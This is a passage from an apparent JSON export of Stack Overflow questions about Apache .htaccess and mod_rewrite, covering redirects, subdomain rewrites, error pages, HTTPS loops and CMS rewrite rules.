want to use is stored locally at C:\\xampp\\htdocs\\error_handler\\index.php)</p>\n\n<p>Dreamhost has a web client that can create what I am guessing is an Alias. When I tried to redirect the folder error_handler on site1.com to /home/username/error_handler, it would seem to work right if I typed site1.com/error_handler in the browser. But if I typed site1.com/test1234 (non-existant), it would say there was a 404 error trying to use the error handler. Also, I would have to login through the web client and point and click (and wait several minutes for the server to restart) every time I wanted to set this up for a new site, even if I could get it to work.</p>\n\n<p>So I tried getting it to work with mod_rewrite, which seems like the most flexible solution. My first attempt looked something like this (stored in /home/username/site1.com/.htaccess for now, though it would eventually be at /home/username/.htaccess:</p>\n\n<pre>RewriteEngine On\nRewriteRule ^error_handler/index.php$ /home/username/error_handler/index.php</pre>\n\n<p>The plain english version of what I was trying to do above is to send requests on any of my sites for error_handler/index.php to /home/username/error_handler/index.php. The mis-understanding I had is that the subsitution will be treated as a file path if it exists. But I missed that the documentation says \"(or, in the case of using rewrites in a .htaccess file, relative to your document root)\". So instead of rewriting to /home/username/error_handler/index.php, it's actually trying to rewrite to /home/username/site1.com/home/username/error_handler/index.php.</p>\n\n<p>I tried including Options +FollowSymLinks because in the Apache documentation it says this:</p>\n\n<p>To enable the rewrite engine in this context [per-directory re-writes in htaccess], you need to set \"RewriteEngine On\" and \"Options FollowSymLinks\" must be enabled. If your administrator has disabled override of FollowSymLinks for a user's directory, then you cannot use the rewrite engine. This restriction is required for security reasons.</p>\n\n<p>I searched around for a while and I couldn't find anything about how Dreamhost handles this (probably because I don't know where to look).</p>\n\n<p>I experimented with RewriteBase because in the Apache documentation it says this:</p>\n\n<p>\"This directive is required when you use a relative path in a substitution in per-directory (htaccess) context unless either of the following conditions are true:</p>\n\n<p>The original request, and the substitution, are underneath the DocumentRoot (as opposed to reachable by other means, such as Alias).\"</p>\n\n<p>Since this is supposed to be a URL path, in my case it should be RewriteBase /, since all my redirects will be from site1.com/error_handler. I also tried Rewrite Base /home/username and RewriteRule ^error_handler/index.php$ error_handler/index.php. However, the Rewrite Base is a URL path relative to the document root. So I need to use something like an alias still. The implication in the quote from the documentation above is that it is possible to use mod_rewrite to send content above the web root. One of the many things I don't know is what the 'other means' besides Alias might be. I believe Alias might not be an option on Dreamhost. At least I couldn't make sense of it.</p>\n"},{"tags":["html",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12281943,"title":"Default 403 page not showing up","body":"<p>I recently set up a few new folders in my server, but I wanted to turn them and all their subfolders forbidden. So, using <code>.htaccess</code>, I simply used <code>deny from all</code>. The issue here is that it's redirecting me to my host's 404 page (which has a lot of advertisements, join us, it looks like their front page), instead of the regular 403 page.</p>\n\n<p>This seems like a very trivial question, but I couldn't find the answer anywhere. How do I get everything in that folder to use the classic 403 page, being this:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;403 Forbidden&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Forbidden&lt;/h1&gt;\n&lt;p&gt;You don't have permission to access /example/example2/exampleC/\non this server.&lt;/p&gt;\n&lt;/head&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Which changes depending on which folder I just entered. If In <code>/example/</code> I have <code>/example1/</code>, <code>/example2/</code> and <code>/example3/</code>, how do I make it so that if I enter /example1/, I get a 403 page that says I don't have access to <code>/example/example1/</code>?</p>\n\n<p>This may seem a bit overly (needlessly) complicated. </p>\n"},{"tags":["php","html","apache",".htaccess","lamp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12282102,"title":"apache (lamp) htaccess php allow access for specific form","body":"<p>I have some files on the server which are protected using htaccess. My problem is that I have a form (php) which will be used by clients to submit some data and this form accesses some files which are protected (e.g. controller.php where I'm querying the db to check if the email is in the database and other types of functionality). </p>\n\n<p>Is there a way to specify that those protected files should be accessible if they are accessed from my form? Otherwise request password or something similar?</p>\n\n<p>What are my options in order to be able to protect my files but still let them be accessed by the form (which is available for users)?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12278682,"title":"Redirect pages using. htaccess","body":"<p>How to use .htaccess redirect page when the url \".php\" or \".html\" or \"?\" or \"=\" ?</p>\n\n<pre><code>Examples\nhttp://www.domain.ltd/index.php     # error, execute redirect to http://www.domain.ltd/ban/\nhttp://www.domain.ltd/index/?id=foo # error, execute redirect to http://www.domain.ltd/ban/\nhttp://www.domain.ltd/index.html    # error, execute redirect to http://www.domain.ltd/ban/\n</code></pre>\n\n<p>Thank you very much</p>\n"},{"tags":[".htaccess","mod-rewrite","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12277225,"title":"rewrite for subdomain","body":"<p>I'm trying to generate subdomains with a rewrite rule.<br>\nIt should look like this:  </p>\n\n<p><a href=\"http://www.example.com.dev/folder/default.html\" rel=\"nofollow\">http://www.example.com.dev/folder/default.html</a><br>\nto<br>\n<a href=\"http://folder.example.com.dev/default.html\" rel=\"nofollow\">http://folder.example.com.dev/default.html</a>  </p>\n\n<p>This is as far as I've got it:<br>\n<code>\nRewriteEngine On<br>\nRewriteBase /<br>\nRewriteCond %{HTTP_HOST} !www.example.com.dev$ [NC]<br>\nRewriteCond %{HTTP_HOST} ^(www.)?([a-z0-9-]+).example.com.dev$ [NC]<br>\nRewriteRule (.*) %2/ [L]</code>  </p>\n\n<p>I'm pretty new to this, so can you help me?<br>\nThanks for your comments  </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":855,"score":3,"question_id":1017812,"title":"Mod ReWrite Catch-All Subdomain","body":"<p>Basically I want *.domain.com to pull up domain.com/*/ (not redirect).</p>\n\n<p>I went into the subdomains section of cPanel and set a wildcard for this domain. It appears to be resolving correctly, ie *.domain.com is bringing up domain.com.</p>\n\n<p>I've now made a htaccess file in the public_html directory containing:</p>\n\n<pre><code>Options +FollowSymLinks\nOptions +Indexes\nRewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} !www.domain.com$ [NC]\nRewriteCond %{HTTP_HOST} ^(www.)?([a-z0-9-]+).domain.com [NC]\nRewriteRule (.*) %2/$1 [L]\n</code></pre>\n\n<p>The error I'm getting is '500 Internal Server Error', any ideas?</p>\n"},{"tags":["apache",".htaccess","url","redirect","http-status-codes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12277908,"title":"How can I show contents in \"/index.html\" by editing .htaccess when the user accesses to a directory URL?","body":"<p>I've a .htaccess in root directory of a domain. I've code below in this .htaccess file:</p>\n\n<p><code>DirectorySlash Off</code></p>\n\n<p>When the user accesses to any directory URL in this domain, I hope server can always forever show contents in <code>/index.html</code> with HTTP status code 200. This <code>/index.html</code> file is located in root directory. Please do not let server redirect the user to the file <code>/index.html</code>.</p>\n\n<p>How can I achieve this by editing .htaccess file? Thank you.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12278586,"title":"Need Pattern Matching Rewrite To Fix Bad Indexed Pages","body":"<p>We had several of our job page URLs indexed with the wrong URL</p>\n\n<p>Bad URL: <a href=\"http://www.mydomain.com/jobs/fl/mechanic-technician/7052/\" rel=\"nofollow\">http://www.mydomain.com/jobs/fl/mechanic-technician/7052/</a></p>\n\n<p>Good URL: <a href=\"http://www.mydomain.com/job-detail/fl/mechanic-technician/7052/\" rel=\"nofollow\">http://www.mydomain.com/job-detail/fl/mechanic-technician/7052/</a></p>\n\n<p>We want to redirect these bad URLs to their corresponding good URL. We do have top level category pages that use the /jobs/ folder. So a blanket redirection of the /jobs/ folder will not work.</p>\n\n<p>We need to mod-rewrite the bad URLs to the good ones using a pattern match, but not too sure how to do pattern matches in apache.</p>\n\n<p>Any suggestions? Thanks in advance.</p>\n"},{"tags":["php",".htaccess","redirect","geolocation","geotargetting"],"answer_count":2,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":1140,"score":3,"question_id":9838344,"title":"how to redirect domain according to country IP address","body":"<p>I made a site it with some subdomains; according to the country's IP address the user is supposed to be automatically redirected to corresponding subdomain. </p>\n\n<p><strong>Example :</strong></p>\n\n<p>Main site is <code>abcd.com</code></p>\n\n<ul>\n<li>Suppose some one from  <strong>India</strong> typed this url abcd.com, </li>\n<li>then the page redirects to <code>ind.abcd.com</code></li>\n</ul>\n"},{"tags":[".htaccess","dns","http-status-code-301","forwarding"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":276,"score":3,"question_id":4384917,"title":"How do I redirect a subdomain to a different domain?","body":"<p>How do I redirect this:</p>\n\n<p><strong>www.sub.example.com</strong> </p>\n\n<p>to this:</p>\n\n<p><strong>www.example2.com</strong></p>\n\n<p>How is this done -- 301? .htaccess? Can someone point me in the right direction please? My host is NearlyFreeSpeech and the domain I want to redirect to is quite a large site with a static IP.</p>\n"},{"tags":[".htaccess","redirect","dns","domain-aliasing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":145,"score":1,"question_id":10619565,"title":"Is it possible to have separate domain alias & redirection depending on subdirectory?","body":"<p>I need to set up the aliasing/redirection of a domain name depending on whether its in a subdirectory or not.</p>\n\n<p><code>newdomain.com</code> is an alias for <code>parent.com/newdomain</code>. This is set up as an alias in the hosting control panel and is working. </p>\n\n<p>I need the url to appear differently depending on the file, e.g</p>\n\n<ul>\n<li>Files in <code>newdomain.com</code> should appear in the location bar as\n<code>parent.com/newdomain/filename.php</code></li>\n<li>Sub-directories in <code>newdomain.com</code> should appear in the location bar\nas <code>newdomain.com/subdir/filename.php</code></li>\n</ul>\n\n<p>I can use htaccess to control redirection, but I haven't found a way for it to control aliasing. \nIs this possible? Thanks</p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":12264436,"title":"URL query (get parameters like ?id=5) redirecting with mod_rewrite in htaccess","body":"<p>My current <code>htaccess</code> looks like</p>\n\n<pre><code>DirectoryIndex welcome.do index.jsp default.php index.wml homepage.php default.htm default.html index.php index.php4 index.php3 index.htm index.html index.shtml default_new_vhost.html\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nRedirectPermanent /content.asp?AUID=01 /content/\n...\n</code></pre>\n\n<p>The redirecting doesn't work (I only get the 404 page of Wordpress). The reason are the get parameters in the URL. I tried the answers posted <a href=\"http://stackoverflow.com/questions/1260632/apache-redirect-301-fails-when-using-get-parameters-such-as-blah\">here</a>. E.g.</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/content.asp$\nRewriteCond %{QUERY_STRING} ^AUID=01$\nRewriteRule ^.*$ http://www.yourdomain.com/content? [L,R=301]\n</code></pre>\n\n<p>Either I get a 500 error or I come to the 404 page of Wordpress. What is the correct way doing this? Than I have many entries in the form</p>\n\n<pre><code>RedirectPermanent /content.asp?pCategory=&amp;pCountry=1&amp;AUID=01 /content/\n</code></pre>\n\n<p>which is wrong, but I look for an efficient way putting this in the htaccess. Can I use something like this instead?</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^/content.asp$\nRewriteCond %{QUERY_STRING} ^pCategory=([0-9]+)&amp;pCountry=([0-6]+)$\nRewriteRule ^.*$ http://www.yourdomain.com/content? [L,R=301]\n</code></pre>\n"},{"tags":[".htaccess","redirect","http-status-code-404","typo3"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":12274894,"title":".htaccess produce 404 page not found in IE","body":"<p>I'm working on Typo3 version 4.7.4. When I can access the Front End of the site in every browser excepts IE (in all version). After replacing the customized .htaccess file to the default .htaccess of the Typo3 version 4.7.4, it works fine. Then I compared both files I couldn't find something different except some more configurations. However, I'm not sure if those new configurations has killed IE. Here is my new .htaccess configuration:</p>\n\n<pre><code>#####################################\n###     Compression via TYPO3     ###\n#####################################\n&lt;FilesMatch \"\\.js\\.gzip$\"&gt;\n    AddType \"text/javascript\" .gzip\n&lt;/FilesMatch&gt;\n&lt;FilesMatch \"\\.css\\.gzip$\"&gt;\n    AddType \"text/css\" .gzip\n&lt;/FilesMatch&gt;\nAddEncoding gzip .gzip\n\n##################################################\n###     Browser caching of resource files     ###\n##################################################\n&lt;FilesMatch \"\\.(js|css)$\"&gt;\n  &lt;IfModule mod_expires.c&gt;\n    ExpiresActive on\n    ExpiresDefault \"access plus 7 days\"\n  &lt;/IfModule&gt;\n  FileETag MTime Size\n&lt;/FilesMatch&gt;\n\n########################################\n###     Settings for mod_rewrite     ###\n########################################\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\n### Change this path, if your TYPO3 installation is located in a subdirectory of the website root.\n#RewriteBase /\n\n### IMPORTANT: This rule has to be the very first RewriteCond in order to work!\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.+)\\.(\\d+)\\.(php|js|css|png|jpg|gif|gzip)$ $1.$3 [L]\n\nRewriteRule ^fileadmin/(.*/)?_recycler_/ - [F]\nRewriteRule ^fileadmin/templates/.*(\\.txt|\\.ts)$ - [F]\nRewriteRule ^typo3conf/ext/[^/]+/Resources/Private/ - [F]\n\n#RewriteRule ^(typo3/|t3lib/|fileadmin/|typo3conf/|typo3temp/|uploads/|favicon\\.ico) - [L]\nRewriteRule ^typo3$ typo3/index_re.php [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule .* index.php [L]\n\n############################################################################\n###     Redirect all users directly to the https version of the page     ###\n############################################################################\n\nRewriteRule ^(.+)\\.(\\d+)\\.(php|js|css|png|jpg|gif|gzip)$ $1.$3 [L]\nRewriteRule ^(typo3/|t3lib/|fileadmin/|typo3conf/|typo3temp/|uploads/|favicon\\.ico) - [L]\nRewriteRule ^typo3$ typo3/index_re.php [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule .* index.php [L]\n\n&lt;/IfModule&gt;\n\n#############################\n###     Miscellaneous     ###\n#############################\nOptions -Indexes\n\n########################################################\n###     Disable *.ts files viewing from Frontend     ###\n########################################################\n&lt;FilesMatch \"\\.(ts)$\"&gt;\n order deny,allow\n deny from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Any ideas would be appreciated.\nThanks</p>\n"},{"tags":["php",".htaccess","rss"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":106,"score":2,"question_id":8001043,"title":"What file extension should I use for dynamic RSS","body":"<p>I am currently developing a dynamic RSS feed that will automatically pull articles from a MySQL database. The code is below</p>\n\n<pre><code>&lt;?php \n\n//Include the post retreival script\nrequire_once '../phpScripts/rss_db_setup.php';\n\n//Set the content type\nheader('Content-type: text/xml');\n\n//Set up the RSS feed information\necho '&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;'.\n '&lt;rss version=\"2.0\"&gt;'.\n\n '&lt;channel&gt;'.\n '&lt;title&gt;Company Name&lt;/title&gt;'.\n '&lt;link&gt;http://www.company.ca&lt;/link&gt;'.\n '&lt;description&gt;&lt;/description&gt;'.\n '&lt;category&gt;&lt;/category&gt;';\n\n//Retreive posts from the database\n$rssData = new rssData();\necho $rssData-&gt;generateFeed($dbcon);\n\n//Close the feed\necho '&lt;/channel&gt;&lt;/rss&gt;';\n\n?&gt;\n</code></pre>\n\n<p>I am wondering whether this file should be saved as a .xml or a .php? I have added the following line to my .htaccess file, but do not really understand exactly how it works</p>\n\n<pre><code>AddType application/x-httpd-php .xml\n</code></pre>\n\n<p>Is this a correct way to do this? Or should I use another htaccess function such as modRewrite, or use a CRON job to generate a new .xml every day or so?</p>\n"},{"tags":["apache",".htaccess","url","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12275867,"title":"url redirect htaccess for custom url","body":"<p>I use this</p>\n\n<p>RewriteEngine on</p>\n\n<p>RewriteCond %{HTTP_HOST} ^http://www.url.com/r/common/home$</p>\n\n<p>RewriteRule ^(.*)$ <a href=\"http://www.url.com\" rel=\"nofollow\">http://www.url.com</a>$ [R=301,L]</p>\n\n<p>whats wrong?</p>\n"},{"tags":["php","apache",".htaccess","https"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12276102,"title":"htaccess infinite redirect loop","body":"<p><br />\nI have been facing this problem for last 2 months.<br />\nI have an htaccess file which I have put in the top hosting directory.<br />\nBut as soon as I put it, it causes redirect infinite loop.<br />\nI was asked by the hosting company to check if I have any other htaccess file enabled.<br />\nBut I have only 1 htaccess file in my whole hosting directory.<br /></p>\n\n<p>Here is the code of my .htaccess<br /></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI}\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Can anyone guess the cause of the infinite loop?</p>\n"},{"tags":["php",".htaccess","get"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":1,"view_count":71,"score":0,"question_id":12274064,"title":"manage friendly URL's with get method and htaccess","body":"<p>I'm trying to create a friendly url manager with PHP.</p>\n\n<p>My problem is, I have this URL:</p>\n\n<pre><code>mywebsite.com/page.php?var1=value1&amp;var2=value2.....etc\n</code></pre>\n\n<p>How I can get same info in this way:</p>\n\n<pre><code>mywebsite.com/page/var1/value1/var2/value2\n</code></pre>\n\n<p>var1,var2,etc.. are dinamically vars they can have other dynamic names</p>\n\n<p>thanks for help!</p>\n"},{"tags":["apache",".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12273254,"title":"Redirect from an https sub-directory to a separate https domain","body":"<p>I'm trying to do the following... either through an apache 2 conf directive or .htaccess.</p>\n\n<p>Two sites:\n1) www.myfirstsite.com\n2) www.my99thsite.com</p>\n\n<p>I want to redirect in the following way and I'm not sure exactly what needs to happen with certs and redirects:</p>\n\n<p>When a user visits <a href=\"https://www.myfirstsite.com/mysubdir\" rel=\"nofollow\">https://www.myfirstsite.com/mysubdir</a> I want to redirect him to <a href=\"https://www.my99thsite.com\" rel=\"nofollow\">https://www.my99thsite.com</a>.</p>\n\n<p>mysubdir is just an empty directory.</p>\n\n<p>Thanks-</p>\n\n<p>-KR</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12273881,"title":".htaccess RewriteRule is changing URL in address bar when I won't want it to","body":"<p>Okay first of all, I want to make my URLs prettier using .htaccess, and I've never done this before. (I'm developing a website on my local machine and viewing the pages with EasyPHP 12.1)</p>\n\n<p>If I type in\n<strong>/localhost/me/about/</strong> I want it to serve the contents of\n<strong>/localhost/me/about.php</strong> WITHOUT changing the URL in the address bar.</p>\n\n<p>If I type in\n<strong>/localhost/me/about.php</strong> I want it to serve up the contents of that file, then CHANGE the address bar to read\n<strong>/localhost/me/about/</strong></p>\n\n<p>Here's my entire .htaccess file so far, and yes it's in the root of my directory, the same directory with all of the .php files:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule ^(.*)/$ http://localhost/me/$1.php\n</code></pre>\n\n<p>This successfully redirects from <strong>localhost/me/about/</strong> to <strong>localhost/me/about.php</strong> (and it works for all of my other pages too). The thing is, I DO NOT want the URL to change in the address bar. Everywhere I look online, I see that I'm supposed to add the [R] flag at the end of my third line if I DO want the address bar updated. I don't have the flag, but the URL in the address bar still changing. What am I missing? Is there a flag I can add to force it not to change?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12265688,"title":"identical name htaccess RewriteRule and file","body":"<p>When I'm rewriting an url in the htaccess file from-to:\n<code>http://www.mydomain.com/news/some%20category/some%20post</code> <code>http://www.mydomain.com/post.php?category=$1&amp;title=$2</code></p>\n\n<p>It works fine, however if I have a file named <code>news.php</code>, the rewrite no longer works and the browser opens this file instead of rewriting to <code>post.php?...</code>.</p>\n\n<p><code>RewriteRule ^news/([^/]*)/([^/]*)$ /post.php?category=$1&amp;title=$2</code></p>\n\n<p>How can I prevent that the link <code>/news/...</code> opens <code>news.php</code></p>\n"},{"tags":["html",".htaccess","modx","modx-revolution"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":121,"score":3,"question_id":12268045,"title":"How to remove .html from the Friendly URL - Modx?","body":"<p>I'm using MODX Revolution 2.2.4-pl. I'm using the supplied .htaccess file and have friendly URLs turned on. These are my rewrite rules. </p>\n\n<p>RewriteCond %{REQUEST_FILENAME} !-f</p>\n\n<p>RewriteCond %{REQUEST_FILENAME} !-d</p>\n\n<p>RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]</p>\n\n<p>What do they need to look like to have it remove the .HTML from the URL?</p>\n\n<p>I've been googling this for the past twenty minutes and my solutions have not worked.\nThanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","ubuntu","wamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12272328,"title":"Mod_rewrite not working on Ubuntu Server (works locally, though)","body":"<p>I have a local environment working fine.  Pasted a test route in .htaccess and it works as expected (re-routes me to google).</p>\n\n<pre><code>RewriteEngine on\nRewriteRule testpage\\.html http://www.google.com [R]\n</code></pre>\n\n<p>I pasted the same thing on my development server (Unbutu 12.04) and it simply gives me a Not Found page.  When I verify it on the devserver by running:</p>\n\n<pre><code>sudo a2enmod rewrite\n</code></pre>\n\n<p>It says \"Module rewrite already enabled\".</p>\n\n<p>Edit:  It also appears in the \"loaded modules\" section of phpinfo() and I have restarted the apache server several times since it was installed.</p>\n\n<p>Any ideas?</p>\n"},{"tags":[".htaccess","url","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":50,"score":3,"question_id":12269151,"title":"htaccess 301 redirect from URL with commas does not redirect","body":"<p>I have a small handful of URLs, that I would like to 301-redirect in my .htaccess-file.</p>\n\n<p>The problem is, that the original URLs contains some weird parameter formatting, that seems to break the redirect.</p>\n\n<p>Basically I need this redirect to work:</p>\n\n<pre><code>redirect 301 \"/index.php?id=365,0,0,1,0,0\" http://my-site.com/about/\n</code></pre>\n\n<p>my-site.com also has a index.php file, but in my mind it should redirect anyway.</p>\n\n<p>Anybody with insights on this one?</p>\n\n<p>Thank you</p>\n"},{"tags":["php","regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12272046,"title":"Using RegExpressions with Mod Rewrite","body":"<p>This is a rule I am using in htaccess file:</p>\n\n<p>RewriteRule ^([a-zA-Z0-9]+)/?$ profile.php?user=$1 [NC,L]</p>\n\n<p>(I want the Rule to allow \"user\" values of letters and/or numbers and nothing else)</p>\n\n<p>Beginning of profile.php:</p>\n\n<p>$userid = filter($_GET['user']);  //this escapes and sanitizes the string</p>\n\n<p>echo $userid; //want to see if the RegExp is allowing variable \"user\" to come thru</p>\n\n<p>Test the following:\n<a href=\"http://www.mysite.com/johnconnor\" rel=\"nofollow\">http://www.mysite.com/johnconnor</a></p>\n\n<p>profile.php does not echo anything for $userid</p>\n\n<p>Now test the following:\n<a href=\"http://www.mysite.com/Johnconnor\" rel=\"nofollow\">http://www.mysite.com/Johnconnor</a></p>\n\n<p>profile.php DOES echo $userid as \"Johnconnor\"</p>\n\n<p>Why is the RegExp not allowing the all lowercase \"johnconnor\" to get thru???\nI've tried this without the \"NC\" as well and no luck.\nThanks in advance!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12269717,"title":"mod_rewrite flags that I dont understand","body":"<p>There a few flags that I have been searching through the internet that I dont seem to understand.</p>\n\n<p>When would you use the [E], flag.</p>\n\n<p>For example.</p>\n\n<pre><code>RewriteRule \\.jpg$ - [env=dontlog:1]\n</code></pre>\n\n<p>What does that do..</p>\n\n<p>And how does the NS (No subsequent requests) work. If I have many includes in my php file..do I need to put it the NS so that it doesnt stop it from working? whats use has it got?</p>\n"},{"tags":["apache",".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12269755,"title":"Can htaccess read a server environment variable set in Apache?","body":"<p>When you set a server environment variable in your Apache settings, it's possible to read that variable from PHP using built in functions.</p>\n\n<p>But can you read the variable from an htaccess file?</p>\n\n<p>What I'm trying to accomplish in my htaccess is something along the lines of:</p>\n\n<pre><code>&lt;If var==\"stuff\"&gt;\ndo things here\n&lt;/if&gt;\n\n&lt;if var==\"different stuff\"&gt;\ndo different things here\n&lt;/if&gt;\n</code></pre>\n"},{"tags":["ajax","wordpress",".htaccess","codeigniter","http-status-code-404"],"answer_count":2,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":2894,"score":1,"question_id":2393452,"title":"Ajax response call, 404 Not Found","body":"<p>i tried to use wordpress and codeigniter for a intelligent join between the best CMS and the best PHP Framework. Actually i intended to use codeigniter for database managemnent and wordpress for display. But i wanted to use codeigniter inside wordpress. So, i have a file tree like that:</p>\n\n<pre><code>www\n- codigniter-core folder\n  - .htaccess\n- wordpress-core folder\n- .htaccess\n- index.php\n</code></pre>\n\n<p>How can i make the wordpress .htaccess to cover also the codeigniter ant not trowing 404 error in jquery ajax call. My current wordpress .htaccess file it's:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n</code></pre>\n\n<p>RewriteEngine On\n RewriteBase /\n RewriteCond %{REQUEST_FILENAME} !-f\n #RewriteCond %{REQUEST_FILENAME} !-d\n RewriteCond $1 !^/codeigniter-core/\n RewriteRule ^(.*)$ /index.php/$1 [L]\n    </p>\n\n<p>I also tried to ask this to <a href=\"http://wordpress.org/support/topic/340291\" rel=\"nofollow\">Wordpress Forums</a> and Codeigniter Forums, but no answer. I think it's hell of a rewrite condition or rule, but i don't know ... </p>\n"},{"tags":["php","apache",".htaccess","search-engine","plesk"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":824,"score":1,"question_id":892682,"title":"Protect Plesk login page from search engine eyes","body":"<p>I was wondering if would it be possible to protect the \"https://www.DOMAIN.com:8443\" URL from search engines listing perhaps using the htaccess to redirect the 8443 port from \"DOMAIN\" to elsewhere?</p>\n\n<blockquote>\n  <p><strong>This is the  VZPP Plesk - Login Login to Plesk. Please enter your\n  login information. Username. Password.\n  Interface Language. User Default,\n  ENGLISH (United States), GERMAN\n  (Germany) ...\n  <a href=\"https://www.DOMAIN.com:8443/\" rel=\"nofollow\">https://www.DOMAIN.com:8443/</a> -</strong></p>\n</blockquote>\n"},{"tags":[".htaccess","mod-rewrite","variables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":215,"score":0,"question_id":892722,"title":".htaccess mod_rewrite playing with variables","body":"<p>I want to have my site urls look like</p>\n\n<pre><code>http://example.com/place/info?var=info&amp;morevars=ifneeded\n</code></pre>\n\n<p>Place and info are also variables but they have a fixed name, the ones after would vary. <strong>EDIT</strong> This is the url I am trying to rewrite</p>\n\n<pre><code>http://example.com/test.php?place=test&amp;action=info&amp;var=info&amp;morevars=ifneeded\n</code></pre>\n\n<p>This is what I have so far</p>\n\n<pre><code>RewriteEngine on\n\nRewriteRule ^([A-Za-z0-9-]+)/?$ test.php?place=$1 [NC]\nRewriteRule ^([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/?$ test.php?place=$1&amp;action=$2 [NC]\n</code></pre>\n\n<p>I think there a way to do this with {QUERY_STRING} but I can't get it to work just 500 errors or it don't make a differences.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12268765,"title":".htaccess file keeps having Internal Errors 500 and 403","body":"<p>I don't know why, but on my host for my website my .htaccess continues to throw apache errors (500 and 403).</p>\n\n<p>My .htaccess file looks like:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} -d [OR]\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -l\nRewriteRule ^ - [L]\nRewriteRule ^([^/]+)/([^/]+)/?$ index.php/?node=$1&amp;id=$2 [L,QSA]\nRewriteRule ^([^/]+)/?$ index.php/?node=$1 [L,QSA]\n</code></pre>\n\n<p>which part of this could be causing this? I'm not very familiar with htaccess so I wouldn't begin to know. 